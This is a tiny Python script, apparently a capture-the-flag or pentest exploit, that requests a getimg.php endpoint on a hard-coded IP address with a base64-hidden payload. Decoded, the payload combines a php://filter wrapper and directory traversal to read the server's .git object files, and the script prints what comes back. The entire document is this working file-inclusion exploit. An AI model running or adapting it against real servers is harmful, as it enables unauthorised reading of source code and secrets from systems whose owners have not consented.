import requests as req

r = req.get('http://3.91.17.218/getimg.php?img=cGhwOi8vZmlsdGVyL3Jlc291cmNlPS4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL3Zhci93d3cvaHRtbC8uZ2l0L29iamVjdHMvOTcvNmI2MjU4ODhhZTBkOWVlOTU0M2YwMjUyNTRmNzFlMTBiN2JjZjg=')


print(r.content)
